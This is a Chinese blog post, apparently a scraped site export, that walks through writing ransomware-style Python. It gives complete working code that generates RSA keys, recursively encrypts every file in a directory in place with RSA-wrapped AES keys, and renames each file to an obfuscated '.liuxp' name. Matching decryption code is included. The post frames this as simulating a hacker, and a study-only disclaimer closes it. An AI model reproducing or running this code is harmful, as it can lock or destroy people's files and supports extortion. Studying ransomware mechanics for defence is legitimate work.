class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Random import get_random_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Encrypt(filename):</span><br><span class=\"line\">    data = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 二进制只读打开文件，读取文件数据</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as f:</span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as out_file:</span><br><span class=\"line\">        <span class=\"comment\"># 收件人秘钥 - 公钥</span></span><br><span class=\"line\">        recipient_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>).<span class=\"built_in\">read</span>())</span><br><span class=\"line\">        <span class=\"comment\"># 一个 16 字节的会话密钥</span></span><br><span class=\"line\">        session_key = get_random_bytes(16)</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the session key with the public RSA key</span></span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</span><br><span class=\"line\">        out_file.write(cipher_rsa.encrypt(session_key))</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the data with the AES session key</span></span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</span><br><span class=\"line\"></span><br><span class=\"line\">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class=\"line\">        out_file.write(cipher_aes.nonce)</span><br><span class=\"line\">        out_file.write(tag)</span><br><span class=\"line\">        out_file.write(ciphertext)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Encrypt(<span class=\"string\">&quot;e://test/music.mp3&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。</p>\n<p>加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。</p>\n<h3 id=\"私钥解密\"><a href=\"#私钥解密\" class=\"headerlink\" title=\"私钥解密\"></a>私钥解密</h3><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Descrypt(filename):</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as fobj:</span><br><span class=\"line\">        <span class=\"comment\"># 导入私钥</span></span><br><span class=\"line\">        private_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>).<span class=\"built_in\">read</span>(), passphrase=code)</span><br><span class=\"line\">        <span class=\"comment\"># 会话密钥， 随机数，消息认证码，机密的数据</span></span><br><span class=\"line\">        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)</span><br><span class=\"line\">                                                   <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> (private_key.size_in_bytes(),</span><br><span class=\"line\">                                                             16, 16, -1)]</span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(private_key)</span><br><span class=\"line\">        session_key = cipher_rsa.decrypt(enc_session_key)</span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</span><br><span class=\"line\"></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as wobj:</span><br><span class=\"line\">        wobj.write(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Descrypt(<span class=\"string\">&quot;e://test/music.mp3&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。</p>\n<p>接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。</p>\n<p>解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！</p>\n<h3 id=\"变更文件名\"><a href=\"#变更文件名\" class=\"headerlink\" title=\"变更文件名\"></a>变更文件名</h3><p>当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：</p>\n<p>举例比如：blog2.rar &#x3D;&#x3D;&gt; yFmcuIzZvxmY.liuxp</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RenameFile(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    filename_bytes = filename.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    filename_bytes_base64 = base64.encodebytes(filename_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\">    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  <span class=\"comment\"># 倒序</span></span><br><span class=\"line\">    new_filename = filename_bytes_base64.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) + <span class=\"string\">&#x27;.liuxp&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print (new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, filename))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, filename), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RenameFile(<span class=\"string\">&quot;e:/test/&quot;</span>, <span class=\"string\">&quot;cool.png&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用了base64对文件名进行编码。</p>\n<h3 id=\"恢复文件名\"><a href=\"#恢复文件名\" class=\"headerlink\" title=\"恢复文件名\"></a>恢复文件名</h3><p>举例比如: yFmcuIzZvxmY.liuxp &#x3D;&#x3D;&gt; blog2.rar</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RestoreFilename(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    f = filename</span><br><span class=\"line\">    filename = filename[::-1][6:][::-1]</span><br><span class=\"line\">    filename_base64 = filename[::-1] + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    filename_bytes_base64 = filename_base64.encode(<span class=\"string\">&#x27;ascii&#x27;</span>)  <span class=\"comment\"># encode as ASCII</span></span><br><span class=\"line\">    ori_filename = base64.decodebytes(filename_bytes_base64).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    new_filename = ori_filename</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, f))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, f), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RestoreFilename(<span class=\"string\">&quot;e://test/&quot;</span>, <span class=\"string\">&quot;0hHdu8GbsVGa.liuxp&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用了base64对文件进行解码。</p>\n<h3 id=\"完整源码\"><a href=\"#完整源码\" class=\"headerlink\" title=\"完整源码\"></a>完整源码</h3><p>我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Random import get_random_bytes</span><br><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def CreateRSAKeys():</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    key = RSA.generate(2048)</span><br><span class=\"line\">    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=<span class=\"string\">&quot;scryptAndAES128-CBC&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 私钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(encrypted_key)</span><br><span class=\"line\">    <span class=\"comment\"># 公钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(key.publickey().exportKey())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Encrypt(filename):</span><br><span class=\"line\">    data = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as f:</span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as out_file:</span><br><span class=\"line\">        <span class=\"comment\"># 收件人秘钥 - 公钥</span></span><br><span class=\"line\">        recipient_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>).<span class=\"built_in\">read</span>())</span><br><span class=\"line\">        session_key = get_random_bytes(16)</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the session key with the public RSA key</span></span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</span><br><span class=\"line\">        out_file.write(cipher_rsa.encrypt(session_key))</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the data with the AES session key</span></span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</span><br><span class=\"line\">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class=\"line\">        out_file.write(cipher_aes.nonce)</span><br><span class=\"line\">        out_file.write(tag)</span><br><span class=\"line\">        out_file.write(ciphertext)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Descrypt(filename):</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as fobj:</span><br><span class=\"line\">        <span class=\"comment\"># 导入私钥</span></span><br><span class=\"line\">        private_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>).<span class=\"built_in\">read</span>(), passphrase=code)</span><br><span class=\"line\">        <span class=\"comment\"># 会话密钥， 随机数，消息认证码，机密的数据</span></span><br><span class=\"line\">        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)</span><br><span class=\"line\">                                                   <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> (private_key.size_in_bytes(),</span><br><span class=\"line\">                                                             16, 16, -1)]</span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(private_key)</span><br><span class=\"line\">        session_key = cipher_rsa.decrypt(enc_session_key)</span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</span><br><span class=\"line\"></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as wobj:</span><br><span class=\"line\">        wobj.write(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RenameFile(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    filename_bytes = filename.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    filename_bytes_base64 = base64.encodebytes(filename_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\">    filename_bytes_base64 = filename_bytes_base64[::-1][1:]</span><br><span class=\"line\">    new_filename = filename_bytes_base64.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) + <span class=\"string\">&#x27;.liuxp&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print (new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, filename))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, filename), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def ReserveFilename(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    f = filename</span><br><span class=\"line\">    filename = filename[::-1][6:][::-1]</span><br><span class=\"line\">    filename_base64 = filename[::-1] + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    filename_bytes_base64 = filename_base64.encode(<span class=\"string\">&#x27;ascii&#x27;</span>)  <span class=\"comment\"># encode as ASCII</span></span><br><span class=\"line\">    ori_filename = base64.decodebytes(filename_bytes_base64).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    new_filename = ori_filename</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, f))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, f), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密代码</span></span><br><span class=\"line\"><span class=\"comment\"># def Main(rootDir):</span></span><br><span class=\"line\"><span class=\"comment\">#     list_dirs = os.walk(rootDir)</span></span><br><span class=\"line\"><span class=\"comment\">#     for root, dirs, files in list_dirs:</span></span><br><span class=\"line\"><span class=\"comment\">#         if False:</span></span><br><span class=\"line\"><span class=\"comment\">#             # 遍历文件，加密并且改名</span></span><br><span class=\"line\"><span class=\"comment\">#             for f in files:</span></span><br><span class=\"line\"><span class=\"comment\">#                 filename = os.path.join(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#                 Encrypt(filename)</span></span><br><span class=\"line\"><span class=\"comment\">#                 RenameFile(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#         else:</span></span><br><span class=\"line\"><span class=\"comment\">#             # 遍历文件，解密并且恢复名字</span></span><br><span class=\"line\"><span class=\"comment\">#             for f in files:</span></span><br><span class=\"line\"><span class=\"comment\">#                 if f.endswith(&#x27;.liuxp&#x27;):</span></span><br><span class=\"line\"><span class=\"comment\">#                     filename = os.path.join(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#                     Descrypt(filename)</span></span><br><span class=\"line\"><span class=\"comment\">#                     ReserveFilename(root, f)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密代码</span></span><br><span class=\"line\">def Main(rootDir):</span><br><span class=\"line\">    list_dirs = os.walk(rootDir)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> root, <span class=\"built_in\">dirs</span>, files <span class=\"keyword\">in</span> list_dirs:</span><br><span class=\"line\">        <span class=\"comment\"># 切换加密和解密过程</span></span><br><span class=\"line\">        <span class=\"comment\"># if False:   # 解密文件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> True:  <span class=\"comment\"># 加密文件</span></span><br><span class=\"line\">            <span class=\"comment\"># 遍历文件，加密并且改名</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">                filename = os.path.join(root, f)</span><br><span class=\"line\">                Encrypt(filename)</span><br><span class=\"line\">                RenameFile(root, f)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 遍历文件，解密并且恢复名字</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">                filename = os.path.join(root, f)</span><br><span class=\"line\">                Descrypt(filename)</span><br><span class=\"line\">                ReserveFilename(root, f)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># CreateRSAKeys()</span></span><br><span class=\"line\">    d = <span class=\"string\">&quot;e://test/&quot;</span></span><br><span class=\"line\">    Main(d)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。</p>\n<p>以下是几个实现的效果图：</p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/1.png\" alt=\"加密之前\"></p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/2.png\" alt=\"加密之后\"></p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/3.png\" alt=\"解密之后\"></p>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>\n<p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>\n<p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><p>用Python实现对文件的加密和解密，即ransomware的代码原理实现。</p>\n<h3 id=\"序\"><a href=\"#序\" class=\"headerlink\" title=\"序\"></a>序</h3><p>如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。</p>","more":"比如<a href=\"https://blog.csdn.net/yilovexing/article/details/104011199\">这个</a>，也可以下载<a href=\"https://www.aliyundrive.com/s/HcrQHfdUYMi\">我提供的文件</a>，然后把下载两个文件夹复制到Python环境的<code>F:\\Python\\Lib\\site-packages\\</code>文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。<p></p>\n<h3 id=\"秘钥生成\"><a href=\"#秘钥生成\" class=\"headerlink\" title=\"秘钥生成\"></a>秘钥生成</h3><p>准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！</p>\n<p>如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。</p>\n<figure 